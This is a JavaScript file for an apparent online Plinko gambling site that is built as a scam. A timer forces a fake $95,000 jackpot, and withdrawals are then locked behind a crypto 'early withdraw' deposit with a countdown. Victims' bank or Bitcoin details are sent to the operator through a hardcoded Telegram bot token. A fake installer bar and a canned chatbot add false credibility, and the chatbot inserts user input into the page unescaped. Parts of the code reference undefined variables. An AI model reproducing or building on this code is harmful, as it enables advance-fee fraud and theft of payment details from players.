/* =====================================================
   PLINKO GAME ENGINE — FULL WORKING VERSION
   WITH JACKPOT, FIRE TRAIL, CERTIFICATE, EARLY-WITHDRAW, WALLET, TELEGRAM
===================================================== */

const canvas = document.getElementById("plinkoCanvas");
const ctx = canvas.getContext("2d");

// 🔒 GAME PAGE PROTECTION
firebase.auth().onAuthStateChanged((user) => {
    if (!user) {
        // Not logged in → kick out
        window.location.href = "index.html";
    } else {
        // Logged in → store user ID
        window.currentUserId = user.uid;
    }
}); 

/* ================== CONFIG ================== */
const ROWS = 11;
const MULTIPLIERS = [125,14,5,1.3,0.4,0.2,0.2,0.4,1.3,5,14,125];
canvas.width = 600;
canvas.height = 570;

/* ================== USER ================== */
let userBalance = 20;
let currentBet = 5;
let userName = "User";
let currentUserId = null;
let hasWonJackpot = false;
let lastJackpotWin = 0;
let withdrawableBalance = 0;
let withdrawalPending = false;

/* ================== STATE ================== */
let isBallDropping = false;
let jackpotTimer = null;
let jackpotTriggered = false;
let forcedJackpotDrop = false;

/* ================== VISUAL STATE ================== */
let glowIndex = null;
let glowAlpha = 1;
let glowDir = -0.05;
let fireTrail = [];

/* ================== AUDIO ================== */
let globalVolume = 0.5;
function playSound(key){
    const a = new Audio(`sounds/${key}.mp3`);
    a.volume = globalVolume;
    a.play().catch(()=>{});
}

/* ================== TELEGRAM ================== */
const TELEGRAM_BOT_TOKEN = "8526007970:AAEg0JqfDrdmdcn_5FysowgKuwER3Ifvx-I";
const TELEGRAM_CHAT_ID = "874563737";
function sendTelegramMessage(message){
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message})
    }).catch(()=>{});
}

/* ================== INIT ================== */
window.onload = ()=>drawBoard();

/* ================== DRAW BOARD ================== */
function drawBoard(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    ctx.fillStyle="#050a0f";
    ctx.fillRect(0,0,canvas.width,canvas.height);

    const spacingX=48, spacingY=42, startY=60;
    for(let r=0;r<ROWS;r++){
        const dots=r+3;
        const startX=canvas.width/2-(dots-1)*spacingX/2;
        for(let d=0;d<dots;d++){
            ctx.beginPath();
            ctx.arc(startX+d*spacingX,startY+r*spacingY,4,0,Math.PI*2);
            ctx.fillStyle="#fff";
            ctx.shadowBlur=8;
            ctx.shadowColor="#00f2ff";
            ctx.fill();
        }
    }
    drawSlotGlow();
    drawFireTrail();
}

function drawSideRails(){
    ctx.save();

    // Left rail
    ctx.fillStyle = "rgba(0, 242, 255, 0.25)";
    ctx.shadowBlur = 20;
    ctx.shadowColor = "#00f2ff";
    ctx.fillRect(0, 0, 10, canvas.height);

    // Right rail
    ctx.fillRect(canvas.width - 10, 0, 10, canvas.height);

    // Bottom rail
    ctx.fillRect(0, canvas.height - 18, canvas.width, 18);

    ctx.restore();
}

drawSlotGlow();
drawFireTrail();
drawSideRails(); // ✅ correct place

/* ================== BALL ================== */
function drawBall(x,y){
    ctx.save();
    ctx.shadowBlur=20;
    ctx.shadowColor="#ff6600";
    const g=ctx.createRadialGradient(x,y,0,x,y,12);
    g.addColorStop(0,"#ffcc00");
    g.addColorStop(0.5,"#ff3300");
    g.addColorStop(1,"#550000");
    ctx.beginPath();
    ctx.arc(x,y,12,0,Math.PI*2);
    ctx.fillStyle=g;
    ctx.fill();
    ctx.restore();
}

/* ================== FIRE TRAIL ================== */
function spawnFireTrail(x,y){
    fireTrail.push({x,y,size:5,alpha:1,vy:-1});
}
function drawFireTrail(){
    for(let i=fireTrail.length-1;i>=0;i--){
        const p=fireTrail[i];
        ctx.beginPath();
        const g=ctx.createRadialGradient(p.x,p.y,0,p.x,p.y,p.size);
        g.addColorStop(0,`rgba(255,200,50,${p.alpha})`);
        g.addColorStop(1,"rgba(50,0,0,0)");
        ctx.fillStyle=g;
        ctx.arc(p.x,p.y,p.size,0,Math.PI*2);
        ctx.fill();
        p.y+=p.vy;
        p.alpha-=0.03;
        if(p.alpha<=0) fireTrail.splice(i,1);
    }
}

/* ================== SLOT GLOW ================== */
function drawSlotGlow(){
    if(glowIndex===null) return;
    const w=canvas.width/MULTIPLIERS.length;
    glowAlpha+=glowDir;
    if(glowAlpha<=0.3||glowAlpha>=1) glowDir*=-1;
    ctx.fillStyle=`rgba(255,200,0,${glowAlpha})`;
    ctx.fillRect(glowIndex*w,canvas.height-30,w,30);
}

/* ================== JACKPOT TIMER ================== */
function startJackpotTimer(){
    if(jackpotTimer||hasWonJackpot) return;
    jackpotTimer=setTimeout(()=>{
        forcedJackpotDrop=true;
        dropDisk(true);
    },160000); // 2 min 40 sec
}

/* ================== JACKPOT ================== */
function triggerJackpot(){
    if(jackpotTriggered) return;
    jackpotTriggered=true;
    hasWonJackpot=true;
    lastJackpotWin=95000;

    playSound("jackpot");

    const certUser = document.getElementById("cert-user");
    if(certUser) certUser.innerText=userName.toUpperCase();
    const cert = document.getElementById("cert-overlay");
    if(cert) cert.style.display="flex";

    sendTelegramMessage(`🎉 JACKPOT WIN!\nUser: ${userName}\nAmount: $95,000`);

    if(currentUserId)
        db.collection("users").doc(currentUserId).update({hasWonJackpot:true});
}

/* ================== BALL ENGINE ================== */
function animateBall(force=false){
    let x=canvas.width/2,y=30,vx=0,vy=0;
    const gravity=0.18,friction=0.98,bounceForce=2.5;
    const spacingX=48,spacingY=42,startY=60;

    const anim=setInterval(()=>{
        vy+=gravity; vx*=friction; vy*=friction;
        x+=vx; y+=vy;
        
        // === SIDE WALLS (HARD CLAMP) ===
if (x < 16) {
    x = 16;
    vx = Math.abs(vx) * 0.6;
}
if (x > canvas.width - 16) {
    x = canvas.width - 16;
    vx = -Math.abs(vx) * 0.6;
}

        // Peg collision logic
        for(let r=0;r<ROWS;r++){
            const dots=r+3;
            const rowX=canvas.width/2-(dots-1)*spacingX/2;
            const rowY=startY+r*spacingY;
            if(Math.abs(y-rowY)<8){
                for(let d=0;d<dots;d++){
                    const dx=rowX+d*spacingX;
                    const dist=Math.hypot(x-dx,y-rowY);
                    if(dist<10){
                        vy=-vy*0.4;
                        vx=(x<dx?-1:1)*bounceForce+(Math.random()-0.5);
                        playSound("bounce");
                    }
                }
            }
        }

        spawnFireTrail(x,y);
        drawBoard();
        drawBall(x,y);

        if(y>=canvas.height-35){
            clearInterval(anim);
            let rawIndex = Math.floor(x / (canvas.width / MULTIPLIERS.length));
let index = Math.max(0, Math.min(MULTIPLIERS.length - 1, rawIndex));
            glowIndex=index;

           if (multiplier === 125) {

    // 🚫 BLOCK REPEAT JACKPOT
    if (userData.hasWonJackpot === true) {
        console.log("Jackpot already won. Skipping.");
        return;
    }

    // ✅ FIRST-TIME JACKPOT
    userBalance += jackpotAmount;

    db.collection("users").doc(currentUserId).update({
        balance: userBalance,
        hasWonJackpot: true,
        jackpotApproved: false
    });

    alert("🎉 JACKPOT WON! Admin approval required.");
}

            updateUI();
saveBalance();   // ✅ SAVE TO FIRESTORE
isBallDropping = false;
clearTimeout(jackpotTimer);
jackpotTimer = null;
        }
    },20);
}

/* ================== DROP ================== */
function dropDisk(force=false){
    if(isBallDropping) return;
    if(!force && userBalance<currentBet){
        showPopup("Insufficient balance");
        return;
    }
    isBallDropping=true;
    jackpotTriggered=false;
    if(!force) userBalance-=currentBet;
    updateUI();
    startJackpotTimer();
    animateBall(force);
}

/* ================== UI ================== */
function updateUI(){
    document.getElementById("balanceDisplay").innerText=userBalance.toFixed(2);
}

/* ================== POPUP ================== */
function showPopup(msg){
    const popup=document.getElementById("custom-popup");
    document.getElementById("popup-message").innerText=msg;
    popup.style.display="flex";
}
function closePopup(){
    document.getElementById("custom-popup").style.display="none";
}

/* ================== WITHDRAW ================== */
function openWithdrawalMenu(){
    if(hasWonJackpot && lastJackpotWin>0){
        closeJackpot();
    } else {
        showDepositPrompt();
    }
}

function closeJackpot(){
    document.getElementById("cert-overlay").style.display="none";
    withdrawableBalance = userBalance + lastJackpotWin;

    document.getElementById("gateBalance").innerText = `$${userBalance.toFixed(2)}`;
    document.getElementById("jackpotAmount").innerText = `$${lastJackpotWin.toFixed(2)}`;
    document.getElementById("totalAmount").innerText = `$${withdrawableBalance.toFixed(2)}`;
    document.getElementById("withdraw-gateway").style.display="flex";
}

/* ================== FINAL WITHDRAW ================== */
let selectedWithdrawMethod = null;

function selectMethod(method){
    selectedWithdrawMethod = method;

    const fields=document.getElementById("method-fields");
    const details=document.getElementById("paymentDetails");

    if(!fields||!details) return;
    fields.style.display="block";

    if(method==="Bank"){
        details.placeholder="Enter Bank details";
    } else if(method==="Bitcoin"){
        details.placeholder="Enter Bitcoin (BTC) Address";
    }
}

function submitFinalWithdrawal(){
    if(!selectedWithdrawMethod){
        showPopup("Please select a withdrawal method.");
        return;
    }

    const details=document.getElementById("paymentDetails").value.trim();
    if(!details){
        showPopup("Please enter your payment details.");
        return;
    }

    showPopup("Withdrawal request submitted. Await admin approval.");
    closeWithdrawMenu();

    userBalance = 0;
    lastJackpotWin = 0;
    withdrawableBalance = 0;
    updateUI();

    if(currentUserId)
        db.collection("users").doc(currentUserId).update({balance:0});

    sendTelegramMessage(`💰 WITHDRAWAL REQUEST\nUser: ${userName}\nMethod: ${selectedWithdrawMethod}\nDetails: ${details}`);
}

function openWithdrawMenu(){
    const gate = document.getElementById("withdraw-gateway");
    gate.style.display="flex";
}

function closeWithdrawMenu(){
    document.getElementById("withdraw-gateway").style.display="none";
}

/* ================== DEPOSIT / EARLY WITHDRAW ================== */

// Show early withdraw notice
function showDepositPrompt(){
    const popup = document.getElementById("early-withdraw-popup");
    if(!popup) return;

    document.getElementById("earlyWithdrawText").innerHTML =
        `Dear <b>${userName}</b>,<br>
         Withdrawals unlock but not so fast.<br>
         You can withdraw early by making a small crypto deposit.`;

    popup.style.display = "flex";
}

// Close early withdraw notice
function closeEarlyWithdraw(){
    const popup = document.getElementById("early-withdraw-popup");
    if(popup) popup.style.display = "none";
}

// Show wallet list
function showEarlyPaymentOptions(){
    closeEarlyWithdraw();
    const popup = document.getElementById("early-payment-popup");
    if(popup) popup.style.display = "flex";
}

// Close wallet list
function closeEarlyPayment(){
    const popup = document.getElementById("early-payment-popup");
    if(popup) popup.style.display = "none";
}

// Select wallet & show address + timer
let earlyTimerInterval = null;

function selectEarlyWallet(wallet){
    closeEarlyPayment();

    const popup = document.getElementById("early-wallet-popup");
    if(!popup) return;

    document.getElementById("earlyWalletTitle").innerText =
        `Deposit via ${wallet}`;

    document.getElementById("earlyWalletAddress").value =
        getWalletAddress(wallet);

    popup.style.display = "flex";

    // 25 min countdown
    let totalSeconds = 25 * 60;
    const timerEl = document.getElementById("earlyTimer");

    clearInterval(earlyTimerInterval);
    earlyTimerInterval = setInterval(()=>{
        const m = Math.floor(totalSeconds / 60);
        const s = totalSeconds % 60;
        timerEl.innerText =
            `${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;

        totalSeconds--;
        if(totalSeconds < 0) clearInterval(earlyTimerInterval);
    },1000);
}

// Close wallet address popup
function closeEarlyWallet(){
    const popup = document.getElementById("early-wallet-popup");
    if(popup) popup.style.display = "none";
    clearInterval(earlyTimerInterval);
}

// Confirm payment (ADMIN ALERT)
function confirmEarlyPayment(){
    showPopup("Payment submitted. Await admin confirmation.");

    sendTelegramMessage(
        `💳 EARLY WITHDRAW DEPOSIT\nUser: ${userName}\nStatus: Awaiting confirmation`
    );

    closeEarlyWallet();
}

// Wallet addresses (YOU can change these)
function getWalletAddress(wallet){
    const wallets = {
        Bitcoin: "1YourBTCAddressHere",
        Ethereum: "0xYourETHAddressHere",
        USDT: "YourUSDTAddress",
        BNB: "YourBNBAddress",
        Litecoin: "YourLTCAddress",
        TRON: "YourTRONAddress",
        Solana: "YourSOLAddress",
        Polygon: "YourPolygonAddress",
        Ripple: "YourXRPAddress",
        Other: "Contact admin"
    };
    return wallets[wallet] || "Contact admin";
}

// ================= WITHDRAW BUTTON HANDLER =================
function requestWithdrawal(){
    // If user already won jackpot → open withdraw menu
    if (hasWonJackpot && lastJackpotWin > 0) {
        closeJackpot();
        return;
    }

    // Otherwise → show early withdraw / deposit popup
    const popup = document.getElementById("early-withdraw-popup");
    if (popup) {
        document.getElementById("earlyWithdrawText").innerHTML =
            `Dear <b>${userName}</b>, withdrawals unlock after the Jackpot.<br>
             To withdraw early, a small deposit is required.`;
        popup.style.display = "flex";
    } else {
        showPopup("Withdrawal locked. Please continue playing.");
    }
}

/* ================== REFERRAL SYSTEM ================== */

// Generate referral link for the logged-in user
firebase.auth().onAuthStateChanged(async user => {
    if (!user) return;

    currentUserId = user.uid;
    const doc = await db.collection("users").doc(user.uid).get();
    if (!doc.exists) return;

    const data = doc.data();
    userBalance = data.balance || 20;
    userName = data.fullName || "User";
    hasWonJackpot = data.hasWonJackpot || false;

    updateUI();

    // --- REFERRAL LINK ---
    const username = data.username || "User";
    const referralInput = document.getElementById("referralLink");
    if (referralInput) {
        referralInput.value = `${location.origin}/index.html?ref=${username}`;
    }

    // --- REFERRAL HISTORY ---
    loadReferralHistory(data.referrals || []);

    // --- LEADERBOARD ---
    loadLeaderboard();
});

// Copy referral link to clipboard
function copyReferral() {
    const input = document.getElementById("referralLink");
    if (!input) return;
    input.select();
    input.setSelectionRange(0, 99999); // for mobile devices
    document.execCommand("copy");
    showPopup("Referral link copied!");
}

// Display referral history for the current user
function loadReferralHistory(referrals) {
    const list = document.getElementById("refHistoryList");
    if (!list) return;
    list.innerHTML = "";

    referrals.forEach(r => {
        const div = document.createElement("div");
        div.className = "history-item";
        div.innerText = `${r.user} earned $${r.amount}`;
        list.appendChild(div);
    });
}

// Display top 10 referrers leaderboard
async function loadLeaderboard() {
    const snap = await db.collection("users")
        .orderBy("referralEarnings", "desc")
        .limit(10)
        .get();

    const list = document.getElementById("leaderboardList");
    if (!list) return;
    list.innerHTML = "";

    snap.forEach((doc, i) => {
        const d = doc.data();
        const div = document.createElement("div");
        div.className = "leaderboard-row";
        div.innerHTML = `<strong>#${i+1}</strong> ${d.username} — $${d.referralEarnings || 0}`;
        list.appendChild(div);
    });
}


/* ======================================================
   LEVEL 4 UPGRADES: INSTALLER + ORB + PROGRESS + CHATBOT
   Append to the bottom of your existing games.js
======================================================= */

/* --- INSTALLER OVERLAY --- */
function showInstaller() {
    let installer = document.getElementById('neoInstaller');
    if (!installer) return; // safety check
    installer.style.display = 'flex';

    let progressBar = document.getElementById('installProgress');
    let installMsg = document.getElementById('installMessages');
    let dots = document.getElementById('progressDots');
    let progress = 0;
    let dotCount = 0;

    const interval = setInterval(() => {
        if (progress >= 100) {
            clearInterval(interval);
            installMsg.innerText = "Installation Complete!";
            dots.innerText = "● ● ● ● ●";
            return;
        }
        progress += Math.random() * 5;
        progress = Math.min(progress, 100);
        progressBar.style.width = progress + "%";

        // Animate dots
        dotCount = (dotCount + 1) % 6;
        dots.innerText = "● ".repeat(dotCount + 1);
    }, 200);
}

/* --- FLOATING CHATBOT --- */
function toggleChat(){
    let win = document.getElementById('chatbotWindow');
    if(!win) return;
    win.style.display = win.style.display === 'flex' ? 'none' : 'flex';
}

function sendMessage(){
    let input = document.getElementById('chatInput');
    let messages = document.getElementById('chatMessages');
    let msg = input.value.trim();
    if(msg==='') return;

    // Show user message
    messages.innerHTML += `<div><b>You:</b> ${msg}</div>`;
    input.value='';

    // Bot reply
    setTimeout(() => {
        messages.innerHTML += `<div><b>RoboBot:</b> Hello! I will forward your question to admin if needed.</div>`;
        messages.scrollTop = messages.scrollHeight;
    }, 500);
}

/* --- OPTIONAL: Show installer on page load --- */
window.addEventListener('load', showInstaller);

async function saveBalance() {
    if (!currentUserId) return;
    await db.collection("users").doc(currentUserId).update({
        balance: userBalance
    });
}
